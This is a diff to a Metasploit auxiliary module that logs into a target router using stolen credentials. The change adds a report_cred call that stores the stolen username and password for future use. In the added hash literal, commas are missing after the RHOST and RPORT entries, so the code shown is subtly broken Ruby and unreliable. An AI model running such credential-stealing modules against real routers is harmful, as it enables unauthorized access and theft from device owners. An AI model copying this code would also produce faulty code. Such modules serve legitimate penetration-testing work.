@@ -5,6 +5,7 @@
 
 class MetasploitModule < Msf::Auxiliary
     include Msf::Exploit::Remote::HttpClient
+    include Msf::Auxiliary::Report
     prepend Msf::Exploit::Remote::AutoCheck
 
     def initialize(info = {})
@@ -26,7 +27,7 @@ class MetasploitModule < Msf::Auxiliary
           },
           'License' => MSF_LICENSE,
           'Author' => [
-            'Unknown independent researcher', # Vulnerability discovery and PoC creation.
+            'Unknown', # Vulnerability discovery and PoC creation.
             'Grant Willcox' # Metasploit Module
           ],
           'References' => [
@@ -123,5 +124,15 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       print_good("Successfully logged into target router using the stolen credentials!")
+      print_status("Storing credentials for future use...")
+      report_cred(
+        ip: datastore['RHOST']
+        port: datastore['RPORT']
+        service_name: 'http'
+        user: username,
+        password: password,
+        proto: 'tcp',
+        type: 'password'
+      )
     end
   end
